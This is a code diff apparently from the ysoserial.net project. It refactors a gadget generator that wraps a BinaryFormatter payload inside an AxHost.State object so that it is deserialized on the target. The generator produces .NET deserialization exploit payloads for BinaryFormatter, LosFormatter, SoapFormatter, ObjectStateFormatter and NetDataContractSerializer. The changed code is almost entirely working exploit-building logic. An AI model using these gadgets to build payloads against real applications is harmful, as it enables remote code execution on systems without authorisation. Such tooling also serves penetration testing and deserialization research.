@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Binary;
 using ysoserial.Helpers;
 
 namespace ysoserial.Generators
@@ -32,30 +34,14 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter", "NetDataContractSerializer"};
         }
 
-        [Serializable]
-        public class AxHostMarshal : ISerializable
-        {
-            byte[] _bfPayload;
-
-            public AxHostMarshal(byte[] payload)
-            {
-                _bfPayload = payload;
-            }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(System.Windows.Forms.AxHost.State));
-                info.AddValue("PropertyBagBinary", _bfPayload);
-            }
-        }
-
         public override object Generate(string formatter, InputArgs inputArgs)
         {
 
             Generator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs); // we could have used AxHostStateGeneratorGadget directly here but it wouldn't have passed our other potential filters using the user input
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
-            AxHostMarshal payloadAxHostMarshal = new AxHostMarshal(Convert.FromBase64String(b64encoded));
+
+            AxHostStateMarshal payloadAxHostMarshal = new AxHostStateMarshal(Convert.FromBase64String(b64encoded));
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
@@ -66,10 +52,7 @@ namespace ysoserial.Generators
             }
             else if(formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
             {
-                InputArgs tempInputArgs = inputArgs.DeepCopy();
-                tempInputArgs.Test = false;
-
-                string utfString = System.Text.Encoding.UTF8.GetString((byte[])Serialize(payloadAxHostMarshal, formatter, tempInputArgs));
+                string utfString = System.Text.Encoding.UTF8.GetString((byte[])SerializeWithNoTest(payloadAxHostMarshal, formatter, inputArgs));
 
                 string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);
 
@@ -104,6 +87,42 @@ namespace ysoserial.Generators
             {
                 throw new Exception("Formatter not supported");
             }
+        }
+    }
+
+    [Serializable]
+    public class AxHostStateMarshal : ISerializable
+    {
+        byte[] _fakePropertyBagBinary;
+
+        public void SetFakePropertyBagBinary(byte[] bfPayload)
+        {
+            _fakePropertyBagBinary = bfPayload;
+        }
+
+        public AxHostStateMarshal(byte[] bfPayload)
+        {
+            SetFakePropertyBagBinary(bfPayload);
+        }
+
+        public AxHostStateMarshal(object fakePropertyBagBinary)
+        {
+            // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
+            MemoryStream stm = new MemoryStream();
+            BinaryFormatter fmt = new BinaryFormatter();
+            fmt.Serialize(stm, fakePropertyBagBinary);
+            SetFakePropertyBagBinary(stm.ToArray());
+        }
+
+        public AxHostStateMarshal(MemoryStream ms)
+        {
+            SetFakePropertyBagBinary(ms.ToArray());
+        }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(System.Windows.Forms.AxHost.State));
+            info.AddValue("PropertyBagBinary", _fakePropertyBagBinary); // This is in form of byte[] - it will be deserialized by BinaryFormatter upon deserialization
         }
     }
 }
